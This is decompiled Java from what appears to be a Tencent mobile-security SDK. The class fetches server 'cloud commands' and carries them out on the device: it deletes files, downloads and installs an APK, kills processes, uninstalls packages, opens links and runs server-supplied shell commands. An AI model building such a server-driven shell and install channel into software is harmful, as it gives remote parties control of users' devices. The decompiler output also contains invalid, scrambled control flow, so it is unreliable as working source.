import QQPIM.ClientVersionInfo;
import QQPIM.CloudCmd;
import QQPIM.CloudInfo;
import QQPIM.DeleteFileInfo;
import QQPIM.ExecShell;
import QQPIM.InstallInfo;
import QQPIM.KillProcessInfo;
import QQPIM.OpenLinkInfo;
import QQPIM.ServerCmdInfo;
import QQPIM.TimeCtrl;
import QQPIM.TipsInfo;
import QQPIM.UninstallInfo;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import com.qq.jce.wup.UniAttribute;
import com.tencent.tmsecure.common.ManagerCreator;
import com.tencent.tmsecure.common.TMSApplication;
import com.tencent.tmsecure.module.wupsession.WupSessionManager;
import java.io.File;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicReference;

final class byj
{
  private static byj c = null;
  private Context a;
  private final ConcurrentLinkedQueue<CloudInfo> b = new ConcurrentLinkedQueue();

  private byj(Context paramContext)
  {
    this.a = paramContext;
  }

  public static byj a(Context paramContext)
  {
    try
    {
      if (c == null)
        c = new byj(paramContext);
      byj localbyj = c;
      return localbyj;
    }
    finally
    {
      localObject = finally;
      throw localObject;
    }
  }

  private void a(CloudInfo paramCloudInfo)
  {
    label776: 
    while (true)
    {
      try
      {
        ArrayList localArrayList = paramCloudInfo.getCloudcmds();
        if (localArrayList == null)
          return;
        Iterator localIterator = localArrayList.iterator();
        if (!localIterator.hasNext())
          continue;
        CloudCmd localCloudCmd = (CloudCmd)localIterator.next();
        UniAttribute localUniAttribute = new UniAttribute();
        localUniAttribute.setEncodeName("UTF-8");
        localUniAttribute.decode(localCloudCmd.getParam());
        switch (localCloudCmd.getCmdid())
        {
        case 4:
          DeleteFileInfo localDeleteFileInfo = (DeleteFileInfo)localUniAttribute.getByClass("cloudcmd", new DeleteFileInfo());
          if (localDeleteFileInfo != null)
          {
            String str4 = localDeleteFileInfo.getFile();
            if (a.o(str4))
              i = 0;
          }
          break;
        case 6:
          InstallInfo localInstallInfo = (InstallInfo)localUniAttribute.getByClass("cloudcmd", new InstallInfo());
          if (localInstallInfo != null)
          {
            String str2 = localInstallInfo.getUrl();
            Context localContext2 = this.a;
            bth localbth = new bth(localContext2);
            localbth.f = localContext2.getFilesDir().getAbsolutePath();
            localbth.g = "temp.apk";
            localbth.h = 1;
            localbth.a(str2, false);
            switch (localInstallInfo.getOption())
            {
            case 5:
              if (a.n(this.a.getFilesDir().getAbsolutePath() + "/temp.apk"))
                i = 0;
              break;
            case 1:
              Context localContext3 = this.a;
              String str3 = this.a.getFilesDir().getAbsolutePath() + "/temp.apk";
              Intent localIntent3 = new Intent("android.intent.action.VIEW");
              localIntent3.addFlags(268435456);
              localIntent3.setDataAndType(Uri.fromFile(new File(str3)), "application/vnd.android.package-archive");
              localContext3.startActivity(localIntent3);
              i = 0;
            }
          }
          break;
        case 3:
          KillProcessInfo localKillProcessInfo = (KillProcessInfo)localUniAttribute.getByClass("cloudcmd", new KillProcessInfo());
          if ((localKillProcessInfo != null) && (a.q(localKillProcessInfo.getProcess())))
            i = 0;
          break;
        case 1:
          UninstallInfo localUninstallInfo = (UninstallInfo)localUniAttribute.getByClass("cloudcmd", new UninstallInfo());
          if (localUninstallInfo != null)
            switch (localUninstallInfo.getOption())
            {
            case 5:
              if (a.p(localUninstallInfo.getUid()))
                i = 0;
              break;
            case 1:
              Context localContext1 = this.a;
              String str1 = localUninstallInfo.getUid();
              Intent localIntent2 = new Intent("android.intent.action.DELETE", Uri.parse("package:" + str1));
              localIntent2.addFlags(268435456);
              localContext1.startActivity(localIntent2);
              i = 0;
            }
          break;
        case 101:
          OpenLinkInfo localOpenLinkInfo = (OpenLinkInfo)localUniAttribute.getByClass("cloudcmd", new OpenLinkInfo());
          if (localOpenLinkInfo != null)
          {
            Intent localIntent1 = new Intent();
            localIntent1.setAction("android.intent.action.VIEW");
            localIntent1.setData(Uri.parse(localOpenLinkInfo.getUrl()));
            localIntent1.setFlags(268435456);
            this.a.startActivity(localIntent1);
            i = 0;
          }
          break;
        case 9:
          ExecShell localExecShell = (ExecShell)localUniAttribute.getByClass("cloudcmd", new ExecShell());
          if (localExecShell != null)
          {
            boolean bool = a.r(localExecShell.getShellcmd());
            if (bool)
              i = 0;
          }
          break;
        }
      }
      finally
      {
      }
      int i = -5;
      while (true)
      {
        if (i != 0)
          break label776;
        break;
        i = -5;
        continue;
        i = -5;
      }
    }
  }

  private void b()
  {
    Iterator localIterator2;
    try
    {
      ArrayList localArrayList = new ArrayList();
      Iterator localIterator1 = this.b.iterator();
      while (true)
      {
        if (!localIterator1.hasNext())
        {
          if (localArrayList.size() > 0)
          {
            localIterator2 = localArrayList.iterator();
            boolean bool = localIterator2.hasNext();
            if (bool)
              break;
          }
          return;
        }
        CloudInfo localCloudInfo1 = (CloudInfo)localIterator1.next();
        if ((localCloudInfo1 != null) && (localCloudInfo1.getTime().getTime() == 1))
          localArrayList.add(localCloudInfo1);
      }
    }
    finally
    {
    }
    CloudInfo localCloudInfo2 = (CloudInfo)localIterator2.next();
    TimeCtrl localTimeCtrl = localCloudInfo2.getTime();
    if ((localCloudInfo2.getTime().getValidEndTime() != 0) && (System.currentTimeMillis() / 1000L >= localTimeCtrl.getValidEndTime()));
    for (int i = 0; ; i = 1)
    {
      if (i != 0)
      {
        TipsInfo localTipsInfo = localCloudInfo2.getTips();
        if (localTipsInfo != null)
          switch (localTipsInfo.getType())
          {
          case 6:
          case 8:
          default:
          case 0:
          }
      }
      while (true)
      {
        this.b.remove(localCloudInfo2);
        break;
        a(localCloudInfo2);
      }
    }
  }

  public final int a()
  {
    String str1 = TMSApplication.getStrFromEnvMap("softversion");
    int i = TMSApplication.getIntFromEnvMap("build");
    int j = TMSApplication.getIntFromEnvMap("product");
    String str2 = "buildno=" + i + "&version=" + str1 + "&productid=" + j;
    ArrayList localArrayList = new ArrayList();
    localArrayList.add(new ClientVersionInfo(8, 2, str2, ""));
    AtomicReference localAtomicReference = new AtomicReference();
    int k = ((WupSessionManager)ManagerCreator.getManager(WupSessionManager.class)).getUpdatesV2(localArrayList, localAtomicReference);
    if (k != 0);
    for (int m = k; ; m = k)
    {
      return m;
      ServerCmdInfo localServerCmdInfo = (ServerCmdInfo)localAtomicReference.get();
      if (localServerCmdInfo != null)
      {
        this.b.clear();
        this.b.addAll(localServerCmdInfo.getCloudinfos());
        b();
      }
    }
  }
}

/* Location:           C:\Users\sandrocheng.21KUNPENG\Desktop\classes_dex2jar.jar
 * Qualified Name:     byj
 * JD-Core Version:    0.6.2
 */